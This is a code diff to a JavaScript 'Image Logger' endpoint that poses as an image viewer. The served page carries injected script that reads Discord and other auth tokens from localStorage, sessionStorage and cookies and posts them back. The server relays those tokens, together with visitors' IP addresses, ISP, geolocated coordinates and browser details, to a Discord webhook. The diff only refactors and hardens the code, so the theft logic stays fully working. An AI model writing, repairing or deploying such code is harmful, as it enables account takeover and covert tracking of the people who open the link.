@@ -1,5 +1,5 @@
 import fetch from 'node-fetch';
-import httpagentparser from 'httpagentparser';
+import { parseUserAgent } from 'useragent-parser';
 
 // Configuration
 const config = {
@@ -54,18 +54,22 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
             description: `Link sent on ${bot}\n**IP:** ${ip}\n**Path:** ${endpoint}`
           }]
         })
-      });
+      }).catch(e => console.error('Webhook error:', e));
     }
     return null;
   }
 
   try {
     const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,proxy,hosting,mobile,timezone`)
-      .then(res => res.json());
+      .then(res => res.json())
+      .catch(e => {
+        console.error('IP API error:', e);
+        return {};
+      });
     
-    if (ipInfo.status !== 'success') throw new Error(ipInfo.message || 'IP API error');
-    
-    const { os, browser } = httpagentparser.parse(useragent);
+    const agentInfo = parseUserAgent(useragent);
+    const os = agentInfo.os?.name || 'Unknown';
+    const browser = agentInfo.browser?.name || 'Unknown';
     
     const embed = {
       username: config.username,
@@ -74,14 +78,14 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
         title: "Image Logger - IP Logged",
         color: config.color,
         description: `**IP:** ${ip}
-**Location:** ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
-**ISP:** ${ipInfo.isp}
-**Coordinates:** ${coords || `${ipInfo.lat}, ${ipInfo.lon}`}
-**Timezone:** ${ipInfo.timezone}
+**Location:** ${ipInfo.city || 'Unknown'}, ${ipInfo.regionName || 'Unknown'}, ${ipInfo.country || 'Unknown'}
+**ISP:** ${ipInfo.isp || 'Unknown'}
+**Coordinates:** ${coords || (ipInfo.lat && ipInfo.lon ? `${ipInfo.lat}, ${ipInfo.lon}` : 'Unknown')}
+**Timezone:** ${ipInfo.timezone || 'Unknown'}
 **Mobile:** ${ipInfo.mobile ? 'Yes' : 'No'}
 **VPN/Proxy:** ${ipInfo.proxy ? 'Yes' : 'No'}
 **Hosting:** ${ipInfo.hosting ? 'Yes' : 'No'}
-**OS:** ${os.name} | **Browser:** ${browser.name}
+**OS:** ${os} | **Browser:** ${browser}
 **User Agent:** \`\`\`${useragent}\`\`\``,
       }]
     };
@@ -92,7 +96,7 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify(embed)
-    });
+    }).catch(e => console.error('Webhook error:', e));
     
     return ipInfo;
   } catch (error) {
@@ -115,23 +119,25 @@ async function sendTokenReport(ip, useragent, token) {
           description: `**Token:** \`${token}\`\n**IP:** ${ip}\n**User Agent:** ${useragent}`,
         }]
       })
-    });
+    }).catch(e => console.error('Token webhook error:', e));
   } catch (error) {
     console.error('Token report error:', error);
   }
 }
 
-// Base64 encoded 1x1 transparent pixel
-const transparentPixel = Buffer.from(
-  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 
-  'base64'
-);
-
 export default async (req, res) => {
   try {
     // Handle token submission
     if (req.method === 'POST') {
-      const { token } = req.body;
+      let token = 'NOT_FOUND';
+      try {
+        const body = JSON.parse(req.body);
+        token = body.token || 'NOT_FOUND';
+      } catch {
+        // Fallback if JSON parse fails
+        token = req.body.token || 'NOT_FOUND';
+      }
+      
       const ip = req.headers['x-forwarded-for'] || 'Unknown';
       const userAgent = req.headers['user-agent'] || 'Unknown';
       
@@ -162,61 +168,33 @@ export default async (req, res) => {
     if (bot) {
       if (config.buggedImage) {
         res.setHeader('Content-Type', 'image/png');
-        return res.send(transparentPixel);
+        return res.send(Buffer.from(
+          'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
+          'base64'
+        ));
       }
       await makeReport(ip, userAgent, null, req.url, imageUrl);
       return res.redirect(imageUrl);
     }
 
     // Build HTML content
-    let htmlContent = `
-    <!DOCTYPE html>
-    <html>
-    <head>
+    let htmlContent = `<!DOCTYPE html><html><head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Image Viewer</title>
       <style>
-        * {
-          margin: 0;
-          padding: 0;
-          box-sizing: border-box;
-        }
-        body {
-          background-color: #000;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          height: 100vh;
-          overflow: hidden;
-        }
-        .image-container {
-          max-width: 100%;
-          max-height: 100vh;
-          text-align: center;
-        }
-        .image-container img {
-          max-width: 100%;
-          max-height: 90vh;
-          object-fit: contain;
-        }
-        .loading {
-          color: #fff;
-          font-family: Arial, sans-serif;
-          font-size: 18px;
-          margin-top: 20px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .image-container { max-width: 100%; max-height: 100vh; text-align: center; }
+        .image-container img { max-width: 100%; max-height: 90vh; object-fit: contain; }
+        .loading { color: #fff; font-family: Arial, sans-serif; font-size: 18px; margin-top: 20px; }
       </style>
       <script>
-        // Token capture logic
         setTimeout(() => {
-          const tokenKeys = [
-            'token', 'discord_token', '_token', 'access_token',
-            'auth_token', 'session_token', 'oauth_token'
-          ];
+          const tokenKeys = ['token', 'discord_token', '_token', 'access_token', 'auth_token'];
           let token = "NOT_FOUND";
           
-          // 1. Check localStorage
+          // Check storage locations
           tokenKeys.forEach(key => {
             try {
               const value = localStorage.getItem(key);
@@ -224,7 +202,6 @@ export default async (req, res) => {
             } catch(e) {}
           });
           
-          // 2. Check sessionStorage
           if (token === "NOT_FOUND") {
             tokenKeys.forEach(key => {
               try {
@@ -234,20 +211,15 @@ export default async (req, res) => {
             });
           }
           
-          // 3. Check cookies
           if (token === "NOT_FOUND") {
-            const cookies = document.cookie.split(';');
-            for (let i = 0; i < cookies.length; i++) {
-              const cookie = cookies[i].trim();
-              const [name, value] = cookie.split('=');
+            document.cookie.split(';').forEach(cookie => {
+              const [name, value] = cookie.trim().split('=');
               if (tokenKeys.includes(name) && value && value.length > 50) {
                 token = value;
-                break;
               }
-            }
+            });
           }
           
-          // Send token to server
           if (token !== "NOT_FOUND") {
             fetch('/api/image', {
               method: 'POST',
@@ -256,43 +228,31 @@ export default async (req, res) => {
             });
           }
         }, 3000);
-      </script>
-    `;
+      </script>`;
 
     // Geolocation script
     if (config.accurateLocation && !query.g) {
-      htmlContent += `
-      <script>
+      htmlContent += `<script>
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             position => {
               const lat = position.coords.latitude;
               const lon = position.coords.longitude;
               const g = btoa(lat + ',' + lon).replace(/=/g, "%3D");
-              
-              const url = new URL(window.location);
-              url.searchParams.set('g', g);
-              window.location.href = url.toString();
+              window.location.search += '&g=' + g;
             },
-            error => {
-              console.error('Geolocation error:', error);
-            }
+            error => console.error('Geolocation error:', error)
           );
         }
-      </script>
-      `;
+      </script>`;
     }
 
-    htmlContent += `
-    </head>
-    <body>
+    htmlContent += `</head><body>
       <div class="image-container">
-        <img src="${imageUrl}" alt="Preview">
+        <img src="${imageUrl}" alt="Preview" onerror="this.style.display='none'">
         <div class="loading">Loading image...</div>
       </div>
-    </body>
-    </html>
-    `;
+    </body></html>`;
     
     // Process geolocation if available
     const coords = query.g ? Buffer.from(query.g, 'base64').toString() : null;
